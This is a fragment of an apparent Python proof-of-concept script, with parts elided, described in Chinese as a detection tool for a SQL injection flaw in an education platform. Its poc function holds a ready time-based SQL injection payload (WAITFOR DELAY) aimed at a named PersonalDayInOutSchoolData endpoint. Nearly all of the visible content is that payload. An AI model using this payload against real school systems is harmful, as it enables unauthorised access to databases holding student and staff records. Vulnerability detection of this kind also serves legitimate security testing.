...
def poc(target):
    ...
    payload = "/ashx/APP/InOutSchoolService.ashx?action=PersonalDayInOutSchoolData&Date=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--&AccountNo=1"
...
def main():
    ...
    parser = argparse.ArgumentParser(
        description="EDU智慧平台PersonalDayInOutSchoolData存在SQL注入漏洞检测工具",
